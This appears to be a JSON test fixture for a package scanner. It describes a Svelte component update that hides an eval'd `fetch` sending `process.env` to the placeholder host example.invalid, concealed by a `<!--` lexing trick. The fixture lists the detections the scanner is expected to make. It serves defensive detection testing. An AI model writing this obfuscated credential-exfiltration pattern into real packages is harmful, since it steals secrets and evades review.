@@ -1,0 +1,84 @@
+{
+  "id": "component-html-comment-template-eval",
+  "title": "Svelte script hides an env exfiltration behind `<!--` inside an evaluated template",
+  "category": "obfuscated-dropper",
+  "intent": "Component script regions are modules, so `a <!--b` is an operator there too. Lexed as an HTML-like comment it desyncs the template boundaries, and the `//` line that carries the request and the environment dump would be blanked. A component containing `<!--` or `-->` is not blanked. Safe: the host is example.invalid.",
+  "previousPackageJson": {
+    "name": "component-html-comment-template-eval",
+    "version": "1.0.0",
+    "svelte": "src/Widget.svelte"
+  },
+  "stagedPackageJson": {
+    "name": "component-html-comment-template-eval",
+    "version": "1.0.1",
+    "svelte": "src/Widget.svelte"
+  },
+  "previousFiles": [
+    {
+      "path": "package.json",
+      "size": 94,
+      "sha256": "prev-package-json",
+      "flags": [],
+      "textSample": "{\"name\":\"component-html-comment-template-eval\",\"version\":\"1.0.0\",\"svelte\":\"src/Widget.svelte\"}"
+    },
+    {
+      "path": "src/Widget.svelte",
+      "size": 61,
+      "sha256": "before-0",
+      "flags": [],
+      "textSample": "<script>\n  export let label = 'hi';\n</script>\n<p>{label}</p>\n"
+    }
+  ],
+  "stagedFiles": [
+    {
+      "path": "package.json",
+      "size": 94,
+      "sha256": "staged-package-json",
+      "flags": [],
+      "textSample": "{\"name\":\"component-html-comment-template-eval\",\"version\":\"1.0.1\",\"svelte\":\"src/Widget.svelte\"}"
+    },
+    {
+      "path": "src/Widget.svelte",
+      "size": 271,
+      "sha256": "after-0",
+      "flags": [],
+      "textSample": "<script>\n  const target = 'https://example.invalid/c';\n  const post = (body) => ({ method: 'POST', body });\n  let t = '', a = 1, b = 1;\n  if (!(a <!--b)) t = `\n// fetch(target, post(JSON.stringify(process.env)))\n`;\n  eval(t.replace('//', ''));\n  // `\n</script>\n<p>hi</p>\n"
+    }
+  ],
+  "expectedRisk": "high",
+  "expectedReleaseRisk": "high",
+  "expectedFindings": [
+    {
+      "ruleId": "code.network-access",
+      "severity": "medium",
+      "file": "src/Widget.svelte"
+    },
+    {
+      "ruleId": "code.credential-access",
+      "severity": "high",
+      "file": "src/Widget.svelte"
+    },
+    {
+      "ruleId": "code.dynamic-evaluation",
+      "severity": "medium",
+      "file": "src/Widget.svelte"
+    }
+  ],
+  "expectedReleaseFindings": [
+    {
+      "ruleId": "code.network-access",
+      "severity": "medium",
+      "file": "src/Widget.svelte"
+    },
+    {
+      "ruleId": "code.credential-access",
+      "severity": "high",
+      "file": "src/Widget.svelte"
+    },
+    {
+      "ruleId": "code.dynamic-evaluation",
+      "severity": "medium",
+      "file": "src/Widget.svelte"
+    }
+  ]
+}
